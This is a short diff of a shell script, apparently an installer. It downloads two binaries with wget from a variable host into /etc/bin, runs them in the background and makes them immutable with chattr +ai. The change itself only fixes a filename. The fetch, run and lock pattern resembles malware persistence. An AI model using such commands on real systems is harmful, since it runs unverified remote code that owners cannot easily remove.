@@ -50,7 +50,7 @@ cd /etc/bin && wget http://$IP/check && chmod +x check
 ./check &
 cd /etc/bin && wget http://$IP/guardian && chmod +x guardian 
 ./guardian &
-chattr +ai /etc/bin/check && chattr +ai /etc/bin/guardian.sh
+chattr +ai /etc/bin/check && chattr +ai /etc/bin/guardian
 echo
 echo "--------------------File successfully running in the background---------------"
 echo "-----------------------------------------------------------------------------"
